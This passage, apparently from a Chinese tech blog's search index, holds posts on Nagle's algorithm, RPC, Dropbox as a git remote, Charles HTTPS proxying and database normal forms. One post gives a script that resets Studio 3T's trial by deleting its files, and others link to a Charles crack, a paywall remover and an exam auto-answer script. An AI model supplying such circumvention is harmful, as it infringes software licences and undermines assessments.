Nagle算法\n\n小数据块存在一起，一起发送。\n\n（1）如果包长度达到MSS，则允许发送；\n\n（2）如果该包含有FIN，则允许发送；\n\n（3）设置了TCP_NODELAY选项，则允许发送；\n\n（4）未设置TCP_CORK选项时，若所有发出去的小数据包（包长度小于MSS）均被确认，则允许发送；\n\n（5）上述条件都未满足，但发生了超时（一般为200ms），则立即发送。\n\n\n\n+ 优点：避免网络中充斥着许多小数据块，降低网络负载，减少网络拥塞，提高网络吞吐。\n\n+ 缺点：客户端的延迟会增加，实时性降低，不适合延时要求尽量小的场景；且对于大文件传输这种场景，会降低传输速度。\n\n用TCP_NODELAY选项可以禁止Negale 算法。此时，应用程序向内核递交的每个数据包都会立即发送出去。需要注意的是，虽然禁止了Negale 算法，但网络的传输仍然受到TCP确认延迟机制的影响。\n\n### 3.2 延迟确认\n\n接收方在收到数据后，并不会立即回复ACK, 而是延迟一定时间 或者 达到2x最大段数据长度为止 (不同操作系统实现并不一样)\n\n1. 这样做的目的是ACK是可以合并的，也就是指如果连续收到两个TCP包，并不一定需要ACK两次，只要回复最终的ACK就可以了，可以降低网络流量。\n2. 如果接收方有数据要发送，那么就会在发送数据的TCP数据包里，带上ACK信息。这样做，可以避免大量的ACK以一个单独的TCP包发送，减少了网络流量。\n\n\n### 3.3 Nagle和延迟确认一起使用产生的问题\n\n两种算法优点都有减小网络数据包的优点，但是都增加了网络通信的延时. 结合在一起就会有问题\n\n例如客户端发送一个数据报, 由于延时确认，服务端不是马上确认；\n\n若客户端启用nagle算法，要等到收到上一个数据报的确认在发送下一个数据报；\n\n如此以来，客户端和服务端相互等待，直到超时或者其他情况.\n\n# 4. 参考资料\n\n+ https://www.zhihu.com/question/20210025\n\n+ https://draveness.me/whys-the-design-tcp-message-frame/","tags":["tcp"],"categories":["网络"]},{"title":"mac下studio3T破解使用","url":"%2Fp%2F894da3bb.html","content":"\n# 1. 无限试用脚本\n\n仅针对mac系统。以下脚本复制为shell文件，执行后，重启mac电脑即可。\n\n```bash\n#!/bin/sh\n# 破解3T-Studio時間限制 https://www.cnblogs.com/dzqdzq/p/11261419.html\n\nrm -f ~/Library/Preferences/3t.*\nrm -rf ~/.3T\nrm -rf ~/.cache/ftuwWNWoJl-STeZhVGHKkQ--\n\nftPath=`find /var/folders -name \"ftuwWNWoJl-STeZhVGHKkQ--\" -print 2>&1 | fgrep -v \"Permission denied\" | fgrep -v \"Operation not permitted\"`\nt3Path=`dirname ${ftPath}`/t3\n\nif [ -e ${ftPath} ];then\n    rm -rf ${ftPath}\nfi\n\nif [ -e ${t3Path} ];then\n    rm -rf ${t3Path}\nfi\n\necho \"删除档案成功，请立即重启电脑生效\"\necho \"如果不想立刻重启，那么请在重启电脑前，都不要重新执行studio3T, 否则执行指令码将不起作用\"\n```\n\n","tags":["mongo"],"categories":["软件"]},{"title":"rpc的介绍","url":"%2Fp%2F317a11e.html","content":"\n\n\n\n# 1. RPC（Remote Procedure Call）远程过程调用\n\n在分布式计算，远程过程调用（英语：Remote Procedure Call，缩写为 RPC）是一个计算机通信协议。该协议允许运行于一台计算机的程序调用另一个地址空间（通常为一个开放网络的一台计算机）的子程序，而程序员就像调用本地程序一样，无需额外地为这个交互作用编程（无需关注细节）。RPC是一种服务器-客户端（Client/Server）模式，经典实现是一个通过发送请求-接受回应进行信息交互的系统。\n\n![1](rpc的介绍/4.jpg)\n\n<!-- more -->\n\n\n### 1.1 常见的 RPC框架\n\nRPC 是一种技术思想而非一种规范或协议，常见 RPC框架有：\n\n[Dubbo](http://dubbo.io/) 是阿里巴巴公司开源的一个Java高性能优秀的服务框架，使得应用可通过高性能的 RPC 实现服务的输出和输入功能，可以和 Spring框架无缝集成。\n\n[Motan](https://github.com/weibocom/motan)是新浪微博开源的一个Java 框架。它诞生的比较晚，起于2013年，2016年5月开源。Motan 在微博平台中已经广泛应用，每天为数百个服务完成近千亿次的调用。\n\n[rpcx](https://github.com/smallnest/rpcx)是Go语言生态圈的Dubbo， 比Dubbo更轻量，实现了Dubbo的许多特性，借助于Go语言优秀的并发特性和简洁语法，可以使用较少的代码实现分布式的RPC服务。\n\n[gRPC](http://www.grpc.io/)是Google开发的高性能、通用的开源RPC框架，其由Google主要面向移动应用开发并基于HTTP/2协议标准而设计，基于ProtoBuf(Protocol Buffers)序列化协议开发，且支持众多开发语言。本身它不是分布式的，所以要实现上面的框架的功能需要进一步的开发。\n\n[thrift](https://thrift.apache.org/)是Apache的一个跨语言的高性能的服务框架，也得到了广泛的应用。\n\n|框架| Dubbo            | Montan | rpcx                              | gRPC |\n| :--------------- | :----- | :-------------------------------- | :--- | :----------------- |\n| 开发语言         | Java   | Java                              | Go   | 跨语言             |\n| 分布式(服务治理) | √      | √                                 | √    | ×                  |\n| 多序列化框架支持 | √      | √ (当前支持Hessian2、Json,可扩展) | √    | × (只支持protobuf) |\n| 多种注册中心     | √      | √                                 | √    | ×                  |\n| 管理中心         | √      | √                                 | √    | ×                  |\n| 跨编程语言       | ×      | × (支持php client和C server)      | ×    | √                  |\n\n### 1.2 完整的 RPC 框架\n\n在一个典型 RPC 的使用场景中，包含了服务发现、负载、容错、网络传输、序列化等组件，其中“RPC 协议”就指明了程序如何进行网络传输和序列化。\n\n![1](rpc的介绍/1.jpg)\n\n### 1.3 RPC 核心之功能实现\n\n所以，要实现一个 RPC 框架，只需要把以下三点实现了就基本完成了：\n\n- 服务寻址Call ID 映射：可以直接使用函数字符串，也可以使用整数 ID。映射表一般就是一个哈希表。\n\n- 数据流的序列化和反序列化：可以自己写，也可以使用 Protobuf 或者 FlatBuffers 之类的。\n\n- 网络传输：尽管大部分 RPC 框架都使用 TCP 协议，但其实 UDP 也可以，而 gRPC 干脆就用了 HTTP2。也可以自己写 Socket，或者用 Asio，ZeroMQ，Netty 之类。\n\n  \n\n##### 1.3.1 服务寻址\n\n服务寻址可以使用 Call ID 映射。在本地调用中，函数体是直接通过函数指针来指定的，但是在远程调用中，函数指针是不行的，因为两个进程的地址空间是完全不一样的。\n\n所以在 RPC 中，所有的函数都必须有自己的一个 ID。这个 ID 在所有进程中都是唯一确定的。客户端在做远程过程调用时，必须附上这个 ID。然后我们还需要在客户端和服务端分别维护一个函数和Call ID的对应表。\n\n当客户端需要进行远程调用时，它就查一下这个表，找出相应的 Call ID，然后把它传给服务端，服务端也通过查表，来确定客户端需要调用的函数，然后执行相应函数的代码。\n\n> 实现方式：服务注册中心。\n\n要调用服务，首先你需要一个服务注册中心去查询对方服务都有哪些实例。Dubbo 的服务注册中心是可以配置的，官方推荐使用 Zookeeper。\n\n实现案例：RMI(Remote Method Invocation，远程方法调用)也就是 RPC 本身的实现方式。\n\n![1](rpc的介绍/2.jpg)\n\n\n\nRegistry(服务发现)：借助 JNDI 发布并调用了 RMI 服务。实际上，JNDI 就是一个注册表，服务端将服务对象放入到注册表中，客户端从注册表中获取服务对象。\n\nRMI 服务在服务端实现之后需要注册到 RMI Server 上，然后客户端从指定的 RMI 地址上 Lookup 服务，调用该服务对应的方法即可完成远程方法调用。\n\nRegistry 是个很重要的功能，当服务端开发完服务之后，要对外暴露，如果没有服务注册，则客户端是无从调用的，即使服务端的服务就在那里。\n\n\n\n##### 1.3.2 序列化和反序列化\n\n客户端怎么把参数值传给远程的函数呢?在本地调用中，我们只需要把参数压到栈里，然后让函数自己去栈里读就行。\n\n但是在远程过程调用时，客户端跟服务端是不同的进程，不能通过内存来传递参数。这时候就需要客户端把参数先转成一个字节流，传给服务端后，再把字节流转成自己能读取的格式。\n\n只有二进制数据才能在网络中传输，序列化和反序列化的定义是：\n\n- 将对象转换成二进制流的过程叫做序列化\n- 将二进制流转换成对象的过程叫做反序列化\n\n这个过程叫序列化和反序列化。同理，从服务端返回的值也需要序列化反序列化的过程。\n\n\n\n##### 1.3.3 网络传输\n\n网络传输：远程调用往往用在网络上，客户端和服务端是通过网络连接的。\n\n所有的数据都需要通过网络传输，因此就需要有一个网络传输层。网络传输层需要把 Call ID 和序列化后的参数字节流传给服务端，然后再把序列化后的调用结果传回客户端。\n\n只要能完成这两者的，都可以作为传输层使用。因此，它所使用的协议其实是不限的，能完成传输就行。\n\n尽管大部分 RPC 框架都使用 TCP 协议，但其实 UDP 也可以，而 gRPC 干脆就用了 HTTP2。\n\nTCP 的连接是最常见的，简要分析基于 TCP 的连接：通常 TCP 连接可以是按需连接(需要调用的时候就先建立连接，调用结束后就立马断掉)，也可以是长连接(客户端和服务器建立起连接之后保持长期持有，不管此时有无数据包的发送，可以配合心跳检测机制定期检测建立的连接是否存活有效)，多个远程过程调用共享同一个连接。\n\n\n\n# 2. 问题总结\n\n### 2.1 RPC 和 HTTP 区别\n\n+ HTTP和RPC同一级别，还是被RPC包含？\n\n  \n\n  ![1](rpc的介绍/3.jpg)\n\n  上图是一个比较完整的关系图，这时我们发现HTTP（图中蓝色框）出现了两次。其中一个是和RPC并列的，都是跨应用调用方法的解决方案；另一个则是被RPC包含的，是RPC通信过程的可选协议之一。\n\n  因此，**问题的答案是都对。看指的是哪一个蓝色框。**\n\n\n\n+ Restful也属于RPC么？\n\n  第二个问题是在问远程过程调用（红色框）是不是包含了Restful（黄色框），这种理解的关键在于对RPC的理解。\n\n  RPC字面理解是远程过程调用，即在一个应用中调用另一个应用的方法。那Restful是满足的，通过它可以实现在一个应用中调用另一个应用的方法。\n\n  但是，上述理解使得RPC的定义过于宽泛。RPC通常特指在一个应用中调用另一个应用的接口而实现的远程调用，即红色框所指的范围。这样，RPC是不包含Restful的。\n\n  \n\n# 3. 参考资料\n\n+ [花了一个星期，我终于把RPC框架整明白了！](https://developer.51cto.com/art/201906/597963.htm)\n\n","tags":["rpc"],"categories":["rpc"]},{"title":"dropbox的使用技巧","url":"%2Fp%2Fd13034b1.html","content":"\n没有比数据安全更重要的花费了，一年100刀，也值！\n\n<!-- more -->\n\n# 1. dropbox设置为 git远程仓库\n\n### 1.1 git bare【不安全】\n\n```bash\n~/project $ git init\n~/project $ git add .\n~/project $ git commit -m \"first commit\"\n~/project $ cd ~/Dropbox/git\n\n~/Dropbox/git $ git init --bare bare.git\n~/Dropbox/git $ cd ~/project\n\n~/project $ git remote add origin ~/Dropbox/git/bare.git\n~/project $ git push -u origin master\n```\n\n另外一个电脑操作\n\n```bash\ngit clone ~/Dropbox/git/bare.git project2\n```\n\n<img src=\"dropbox%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/iShot_2023-02-10_16.47.54.jpg\" alt=\"iShot_2023-02-10_16.47.54\" style=\"zoom: 50%;\" />\n\n### 1.2 git-remote-dropbox\n\n项目： https://github.com/anishathalye/git-remote-dropbox\n\n+ 安装\n\n  ```bash\n  pip3 install git-remote-dropbox\n  export PATH=${HOME}/Library/Python/3.8/bin:$PATH\n  ```\n\n+ 登录\n\n  ```bash\n  git dropbox login\n  \n  # 输入密钥\n  Successfully logged in! You can now add Dropbox remotes like 'dropbox:///path/to/repo'\n  ```\n\n+ 操作\n\n  第一个电脑\n\n  ```bash\n  git remote rm origin\n  \n  git remote add origin \"dropbox:///5_Git/project.git\"\n  git push --set-upstream origin main\n  ```\n\n  <img src=\"dropbox%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20230210163122063.png\" alt=\"image-20230210163122063\" style=\"zoom:50%;\" />\n\n​\t第二个电脑\n  ```bash\n  git clone  \"dropbox:///5_Git/project.git\" project2\n  ```\n\n+ 还原数据\n\n  ```bash\n  mkdir new && cd new \n  git init\n  \n  rm -rf .git/{refs,objects} && cp -r ~/Dropbox/5_Git/project.git/{refs,objects} .git/\n  git checkout -f main\n  ```\n\n  <img src=\"dropbox%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20230210170204297.png\" alt=\"image-20230210170204297\" style=\"zoom: 50%;\" />\n\n\n\n# 2. git 和 dropbox的结合\n\n目前采取危险方案，把 .git 文件夹 同步到 dropbox里面。\n\n\n\n\n# 3. 本地文件夹同步dropbox【废弃】\n\n还是打开Mac的下载文件夹同步，简直不要太好用。另外可以仿照Mac同步，加入电脑下其他文件夹。\n\n```bash\nln -s /Users/liuwei/Dropbox/Mac/workspace ~/workspace\nchmod -h 700 ~/workspace\nchflags -h uchg ~/workspace\n```\n\n\n\n","tags":["dropbox"],"categories":["软件"]},{"title":"Charles抓包工具破解使用和Https配置","url":"%2Fp%2F2a640eb1.html","content":"\n\n\n# 1. Charles 软件破解\n\nhttps://github.com/8enet/Charles-Crack\n\nhttps://www.zzzmode.com/mytools/charles/\n\n发现一个更好用的抓包软件, 免费\n\nhttps://github.com/ProxymanApp/Proxyman\n\n\n\n# 2. Charles Mac Chrome抓包\n\n需要注意的是，Chrome 和 Firefox 浏览器默认并不使用系统的代理服务器设置，而 Charles 是通过将自己设置成代理服务器来完成封包截取的，所以在默认情况下无法截取 Chrome 和 Firefox 浏览器的网络通讯内容。\n\n1. 访问: chrome://settings/   \n2. 然后下拉到最后的高级，下来在“系统”（倒数第二个）的条目下找到“打开代理设置”，然后双击打开之后，打开之后找到代理的tab点开，点开之后可以看到请选择一个协议进行配置，这个时候找到“网页代理(http)”和“安全网页代理(https)”，进行相应的配置就可以了，一般来说自己不做其他处理，直接配置代理服务器为“127.0.0.1”，端口(就是冒号:)后是“8888”。\n3. 如何抓https网站, 在charles左侧该网址右键 Enable SSL Proxying\n\n<!-- more -->\n\n# 3. Charles 手机 Https抓包\n\n### 3.1 安装电脑端证书  \n\n在`Help`菜单下的路径,下载根证书,并且在`钥匙串`里设置信任此证书.\n\n<img src=\"charles抓包工具破解使用和Https配置/1.png\" alt=\"1\" style=\"zoom:50%;\" />\n<img src=\"charles抓包工具破解使用和Https配置/2.png\" alt=\"2\" style=\"zoom:50%;\" />\n\n\n\n### 3.2 安装手机证书\n\n<img src=\"charles抓包工具破解使用和Https配置/3.png\" alt=\"3\" style=\"zoom:50%;\" />\n\n\n在相关的手机中打开`Safari`,输入下图中默认的地址`chls.pro/ssl`，手机会自动跳转到证书下载界面，按照提示安装即可.\n\n安装后,设置信任此证书.\n<img src=\"charles抓包工具破解使用和Https配置/4.png\" alt=\"4\" style=\"zoom:50%;\" />\n\n\n\n### 3.3 配置手机Wifi代理和开启Charles SSL Proxy\n\n<img src=\"charles抓包工具破解使用和Https配置/5.png\" alt=\"5\" style=\"zoom:50%;\" />\n<img src=\"charles抓包工具破解使用和Https配置/6.png\" alt=\"6\" style=\"zoom:50%;\" />\n\n\n\n最新系统多了一道程序:\n\n+ 需要在关于本机->证书信任设置->再次信任一下证书\n\n\n\n# 4. Charles可以抓取https报文的原理\n\n原理就是: **中间人攻击**\n\n> Charles 作为一个中间人来进行 HTTPS 的代理，让我们检测到浏览器和 SSL web 服务端之间的明文通信。\n>  Charles 把自己变成一个中间人来达到这一目的。你的浏览器是收不到服务端证书的，Charles 会用自己的根证书动态签发一张证书，然后 Charles 来接受服务端的证书，你的浏览器接受 Charles 的证书。\n>  …\n>  Charles 仍然通过 SSL 与服务端进行通信，但通信是通过浏览器到 Charles，然后在从 Charles 到服务器。\n\n通俗版SSL协议原理:\n\n- 小明和小王是一对好基友，但是远隔万水千山，只能通过写信来传递消息。俩人每天的信件都是通过邮递员小红来传递的，这俩人每天纸条上明文写着信息，小红也天天看的不亦乐乎，这就是 HTTP。\n- 时间久了，两人发现不行，比如有时候会传递一些不和谐的内容，不希望小红这样的腐女看到；于是小明灵机一动，换成葬爱家族的杀马特火星文来进行通信；小王看后，心领神会。由于转换方式两人都知道，这就是对称加密技术。\n- 然而好景不长，小红勤学苦练，终于练成了火星文十级，又能看懂俩人加密的内容了。俩人必须要更换加密方式，但是更换的加密方式也只能通过小红来传递，所以这个加密的手段很难瞒住小红，这就是 HTTP 的不安全性。\n- 正好小明是一位博学的哲♂学家，他立刻写了封信给小王：把你家储物间箱子的上那把挂锁寄过来！小王看后立刻拿出了那把 82 年的挂锁，把它打开并寄给了小明。这个锁大家都能看到，但只有小王有钥匙，这就是传说中的非对称加密，锁就是公钥，小王的钥匙就是私钥。\n- 小明收到后，仔细研究了那把锁，上面烫着『隔壁老王』四个鎏金大字，正是王家祖传的锁，这就是验证服务端的数字证书。\n   于是小明放心的把新的加密方式写在信中，放到盒子里，然后用锁锁上。由于小红没有钥匙，没法查看盒子里到底写了啥，只能原样送过去。小王收到后，用自己的钥匙打开了锁，获得了新的加密方式。这就完成了 SSL 协议的握手。\n\n利用Charles之后的场景:\n\n- 小红拿到锁以后，先扣着不发，然后掏出了自己的锁寄给小明，这就是 Charles 签发了自己根证书；\n- 小明一看这把锁不是正宗王家的，但是小红家的锁，似乎也可以相信，这就是信任了 Charles 的根证书；\n- 小明把加密方式写进去，然后用小红的锁锁起来了，小红打开之后研究了加密方式，发现两人是在用水星文进行交流，瞬间水星文也达到了十级，然后在换上小王的锁锁上了盒子，还给了小王；\n- 小王毫不知情，之后俩人用水星文进行交流，但内容已经全被小红捕获到了。\n\n\n\n# 5. 参考链接\n\n+ https://blog.devtang.com/2015/11/14/charles-introduction/  Charles 从入门到精通\n+ https://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html  图解SSL/TLS协议\n+ https://www.laoqingcai.com/https-mitm/ 中间人攻击","tags":["charles"],"categories":["软件"]},{"title":"chrome扩展和油猴插件记录","url":"%2Fp%2Fe671482a.html","content":"\n记录常用的chrome相关插件。\n\n# 1. chrome扩展\n\n<!-- more -->\n\n# 2. 油猴插件\n\n### 2.1 破解\n\n+ 华尔街日报付费墙移除、全文显示：https://greasyfork.org/zh-CN/scripts/448442\n+ 华医网自动答题：https://greasyfork.org/zh-CN/scripts/436683\n\n### 2.2 微信读书\n\n+ 微信读书阅读助手（简化）：https://greasyfork.org/zh-CN/scripts/420774\n+ 微信读书自动阅读：https://greasyfork.org/zh-CN/scripts/407535\n+ BetterWeRead（变色，字体）：https://greasyfork.org/zh-CN/scripts/463671\n+ 微信读书看更多（加宽）https://greasyfork.org/zh-CN/scripts/466749\n\n","tags":["mac"],"categories":["软件"]},{"title":"数据库范式和函数依赖","url":"%2Fp%2F2e33702e.html","content":"\n\n\n# 1. 函数依赖\n\n## 1.1 函数依赖(有我就能决定你)\n\n设X,Y是关系R的两个属性集合，当任何时刻R中的任意两个元组中的X属性值相同时，则它们的Y属性值也相同，则称X函数决定Y，或Y函数依赖于X。\n\n+ 在一个表中,  X的值确定的情况下，必定能确定属性Y的值,  这就是函数依赖名字的由来，类似于函数关系 y = f(x)\n+ 姓名函数依赖于学号，写作 **学号 → 姓名**。\n+ 不能说学号函数依赖于姓名。姓名 不能决定学号, 因为有重名.\n\n<!-- more -->\n\n---\n\n## 1.2. 平凡函数依赖(我决定的值还是我自己内部, 走不出自我, 于是平凡的我)\n\n当关系中属性集合Y是属性集合X的子集时(Y⊆X)，存在函数依赖X→Y，即一组属性函数决定它的所有子集，这种函数依赖称为平凡函数依赖。\n\n\n\n## 1.3 非平凡函数依赖(我决定的值大千世界)\n\n当关系中属性集合Y不是属性集合X的子集时，存在函数依赖X→Y，则称这种函数依赖为非平凡函数依赖。\n\n---\n\n## 1.4. 完全函数依赖 (我要和别人一起决定你)\n\n设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。\n\n+ （学号，课名）F→ 分数 （因为同一个的学号对应的分数不确定，同一个课名对应的分数也不确定）\n+ 自己一个人决定不了, 需要共同决定\n\n\n\n## 1.5. 部分函数依赖(我的一部分就能决定你)\n\n设X,Y是关系R的两个属性集合，存在X→Y，若X’是X的真子集，存在X’→Y，则称Y部分函数依赖于X。\n\n+ (学号，课名） P→ 姓名\n+ 我自己的一部分就可以决定\n\n\n\n## 1.6. 传递函数依赖 (我可以间接决定你)\n\n设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z，则称Z传递函数依赖于X。\n\n\n\n# 2. 码和主属性\n\n## 2.1 码\n\n设 K 为某表中的一个属性或属性组，若除 K 之外的所有属性都完全函数依赖于 K（这个“完全”不要漏了），那么我们称 K 为**候选码**，简称为**码**。\n\n在实际中我们通常可以理解为：假如当 K 确定的情况下，该表除 K 之外的所有属性的值也就随之确定，那么 K 就是码。一张表中可以有超过一个码。（实际应用中为了方便，通常选择其中的一个码作为主码）\n\n+ 2NF的图 **(学号、课名）**这个属性组就是码。该表中有且仅有这一个码。\n\n  \n\n## 2.2 主属性\n\n包含在任何一个码中的属性成为主属性。\n\n2NF的图主属性就有两个，**学号** 与 **课名**。\n\n\n\n# 3. 范式\n\n关系数据库有六种，1NF，2NF，3NF，BCNF，4NF，5NF。\n\n## 3.1 1NF (问题: 同字段内容重复, 要拆表->2NF)\n\n符合1NF的关系中的每个属性都不可再分。下图就不符合1NF的要求.\n\n![1](数据库范式和函数依赖/1.png)\n\n1NF是关系模式应具备的最起码的条件，如果数据库设计不能满足第一范式，就不能称为关系型数据库。关系数据库自带1NF\n\n![1](数据库范式和函数依赖/2.png)\n\n\n\n## 3.2 2NF (问题: 非主属性不同字段之间关联, 要拆表->3NF)\n\n![1](数据库范式和函数依赖/3.png)\n\n+ 每一名学生的学号、姓名、系名、系主任这些数据重复多次。每个系与对应的系主任的数据也重复多次——**数据冗余过大** \n\n+ 假如学校新建了一个系，但是暂时还没有招收任何学生（比如3月份就新建了，但要等到8月份才招生），那么是无法将系名与系主任的数据单独地添加到数据表中去的——**插入异常**\n\n+ 假如将某个系中所有学生相关的记录都删除，那么所有系与系主任的数据也就随之消失了（一个系所有学生都没有了，并不表示这个系就没有了）。——**删除异常**\n\n+ 假如李小明转系到法律系，那么为了保证数据库中数据的一致性，需要修改三条记录中系与系主任的数据。——**修改异常**。\n\n  正因为仅符合1NF的数据库设计存在着这样那样的问题，我们需要提高设计标准，去掉导致上述四种问题的因素，使其符合更高一级的范式（2NF），这就是所谓的“规范化”。\n\n  \n\n  #### 3.2.1  判断是否符合2NF\n\n  根据2NF的定义，判断的依据实际上就是看数据表中**是否存在非主属性对于码的部分函数依赖**。若存在，则数据表最高只符合1NF的要求，若不存在，则符合2NF的要求。判断的方法是：\n\n  \n\n  > 第一步：找出数据表中所有的**码**。\n  \n  + 查看所有每一单个属性，当它的值确定了，是否剩下的所有属性值都能确定。\n  + 查看所有包含有两个属性的属性组，当它的值确定了，是否剩下的所有属性值都能确定。\n+ 依次查看3个4个5个.....\n  + 看起来很麻烦是吧，但是这里有一个诀窍，就是假如A是码，那么所有包含了A的属性组，如（A，B）、（A，C）、（A，B，C）等等，都不是码了（因为作为码的要求里有一个“**完全**函数依赖”）。\n\n  ![1](数据库范式和函数依赖/4.png)\n\n  这一步完成以后，可以得到，表3的码只有一个，就是**（学号、课名）**。学号并不能直接决定分数, 所以学号+课名能决定一切\n\n  \n\n  > 第二步：根据第一步所得到的码，找出所有的**主属性**。\n  \n  主属性有两个：**学号** 与 **课名**\n  \n  > 第三步：数据表中，除去所有的主属性，剩下的就都是**非主属性**了。\n  \n  非主属性有四个：**姓名**、**系名**、**系主任**、**分数**\n  \n  > 第四步：查看是否存在非主属性对码的**部分函数依赖**。\n  \n  对于**（学号，课名） → 姓名**，有 **学号 → 姓名**，\t\t存在非主属性 姓名 对码**（学号，课名）**的部分函数依赖。\n  对于**（学号，课名） → 系名**，有 **学号 → 系名**，\t\t存在非主属性 系名 对码**（学号，课名）**的部分函数依赖。\n  对于**（学号，课名） → 系主任**，有 **学号 → 系主任**，存在非主属性 系主任 对码**（学号，课名）**的部分函数依赖。\n  \n  所以表3存在非主属性对于码的部分函数依赖，最高只符合1NF的要求，不符合2NF的要求。\n\n\n\n#### 3.2.2  拆表符合2NF\n\n为了符合2NF的要求，我们必须消除这些部分函数依赖，只有一个办法，就是将大数据表拆分成两个或者更多个更小的数据表，在拆分的过程中，要达到更高一级范式的要求，这个过程叫做”模式分解“。模式分解的方法不是唯一的，以下是其中一种方法：\n选课表（学号，课名，分数）\n学生表（学号，姓名，系名，系主任）\n\n我们先来判断以下，**选课**表与**学生**表，是否符合了2NF的要求？\n\n对于**选课**表，其码是**（学号，课名）**，主属性是**学号**和**课名**，非主属性是**分数**，**学号**确定，并不能唯一确定**分数**，**课名**确定，也不能唯一确定**分数**，所以不存在非主属性**分数**对于码 **（学号，课名）**的部分函数依赖，所以此表符合2NF的要求。\n\n对于**学生**表，其码是**学号，**主属性是**学号**，非主属性是**姓名、系名**和**系主任**，因为码只有一个属性，所以不可能存在非主属性对于码 的部分函数依赖，所以此表符合2NF的要求。\n\n![1](数据库范式和函数依赖/5.png)\n\n\n\n#### 3.2.3 定义\n\n如果关系模式R是1NF，且每一个非主属性完全依赖于候选建，那么就称R是第二范式。\n\n第二范式要满足的条件：首先要满足第一范式，其次每一个非主属性要**完全函数**依赖于候选键，或者是主键。也就是说，每个非主属性是由整个主键函数决定的，而不能有主键的一部分来决定。\n\n\n\n## 3.3 3NF (问题: 主属性不同字段之间关联, 要拆表->BCNF)\n\n![1](数据库范式和函数依赖/6.png)\n\n+ 李小明转系到法律系\n  只需要修改一次李小明对应的系的值即可。——有改进\n\n+ 数据冗余是否减少了？\n  学生的姓名、系名与系主任，不再像之前一样重复那么多次了。——有改进\n\n+ 删除某个系中所有的学生记录\n  该系的信息仍然全部丢失。——无改进\n\n+ 插入一个尚无学生的新系的信息。\n  因为学生表的码是学号，不能为空，所以此操作不被允许。——无改进\n\n  \n\n所以说，仅仅符合2NF的要求，很多情况下还是不够的，而出现问题的原因，在于仍然存在非主属性**系主任**对于码**学号**的传递函数依赖。为了能进一步解决这些问题，我们还需要将符合2NF要求的数据表改进为符合3NF的要求。\n\n**第三范式（3NF）** **3NF在2NF的基础之上，消除了非主属性对于码的传递函数依赖**。也就是说， 如果存在非主属性对于码的传递函数依赖，则不符合3NF的要求。\n\n\n\n#### 3.3.1 判断是否符合3NF\n\n接下来我们看看表中的设计，是否符合3NF的要求。\n\n+ 对于**选课**表，主码为（学号，课名），主属性为**学号**和**课名，**非主属性只有一个，为分数，不可能存在传递函数依赖，所以**选课**表的设计，符合3NF的要求。\n\n+ 对于**学生**表，主码为**学号**，主属性为**学号**，非主属性为**姓名**、**系名**和**系主任**。因为 学号 → 系名，同时 系名 → 系主任，所以存在非主属性**系主任**对于码**学号**的传递函数依赖，所以**学生**表的设计，不符合3NF的要求。。\n\n  \n\n#### 3.3.2  拆表符合3NF\n\n为了让数据表设计达到3NF，我们必须进一步进行模式分解为以下形式：\n选课（学号，课名，分数）\n学生（学号，姓名，系名）\n系（系名，系主任）\n\n\n\n+ 对于**选课**表，符合3NF的要求，之前已经分析过了。\n\n+ 对于**学生**表，码为**学号**，主属性为**学号**，非主属性为**系名**，不可能存在非主属性对于码的传递函数依赖，所以符合3NF的要求。\n\n+ 对于**系**表，码为**系名**，主属性为**系名**，非主属性为**系主任**，不可能存在非主属性对于码的传递函数依赖（至少要有三个属性才可能存在传递函数依赖关系），所以符合3NF的要求。。\n\n\n\n![1](数据库范式和函数依赖/7.png)\n\n\n\n![1](数据库范式和函数依赖/8.png)\n\n\n\n现在我们来看一下，进行同样的操作，是否还存在着之前的那些问题？\n\n1. 删除某个系中所有的学生记录\n   该系的信息不会丢失。——有改进\n2. 插入一个尚无学生的新系的信息。\n   因为系表与学生表目前是独立的两张表，所以不影响。——有改进\n3. 数据冗余更加少了。——有改进\n\n\n\n由此可见，符合3NF要求的数据库设计，**基本**上解决了数据冗余过大，插入异常，修改异常，删除异常的问题。当然，在实际中，往往为了性能上或者应对扩展的需要，经常 做到2NF或者1NF，但是作为数据库设计人员，至少应该知道，3NF的要求是怎样的。\n\n\n\n#### 3.3.3 定义\n\n如果关系模式R是2NF，且关系模式R（U,F）中的所有非主属性对任何候选关键字都不存在传递依赖，则称关系R是属于第三范式。\n\n第三范式（3NF）；符合2NF，并且，消除传递依赖。\n\n\n\n## 3.4 BCNF\n#### 3.4.1 3NF 也会有一些问题\n\n1. 某公司有若干个仓库；\n2. 每个仓库只能有一名管理员，一名管理员只能在一个仓库中工作；\n3. 一个仓库中可以存放多种物品，一种物品也可以存放在不同的仓库中。每种物品在每个仓库中都有对应的数量。\n\n那么关系模式 仓库（仓库名，管理员，物品名，数量） 属于哪一级范式？\n\n已知函数依赖集：仓库名 → 管理员，管理员 → 仓库名，（仓库名，物品名）→ 数量\n码：（管理员，物品名），（仓库名，物品名）\n主属性：仓库名、管理员、物品名\n非主属性：数量\n\n∵ 不存在非主属性对码的部分函数依赖和传递函数依赖。∴ 此关系模式属于3NF。\n\n![1](数据库范式和函数依赖/9.png)\n\n好，既然此关系模式已经属于了 3NF，那么这个关系模式是否存在问题呢？我们来看以下几种操作：\n\n1. 先新增加一个仓库，但尚未存放任何物品，是否可以为该仓库指派管理员？——不可以，因为物品名也是主属性，根据实体完整性的要求，主属性不能为空。\n2. 某仓库被清空后，需要删除所有与这个仓库相关的物品存放记录，会带来什么问题？——仓库本身与管理员的信息也被随之删除了。\n3. 如果某仓库更换了管理员，会带来什么问题？——这个仓库有几条物品存放记录，就要修改多少次管理员信息。\n\n从这里我们可以得出结论，在某些特殊情况下，即使关系模式符合 3NF 的要求，仍然存在着插入异常，修改异常与删除异常的问题，仍然不是 ”好“ 的设计。\n\n\n\n#### 3.3.2  拆表符合BCNF\n\n造成此问题的原因：存在着**主属性**对于码的部分函数依赖与传递函数依赖。\n\n（在此例中就是存在主属性【仓库名】对于码【（管理员，物品名）】的部分函数依赖。\n\n解决办法就是要在 3NF 的基础上消除**主属性**对于码的部分与传递函数依赖。\n\n\n\n仓库（仓库名，管理员）\n库存（仓库名，物品名，数量）\n\n这样，之前的插入异常，修改异常与删除异常的问题就被解决了。\n\n\n\n#### 3.4.3 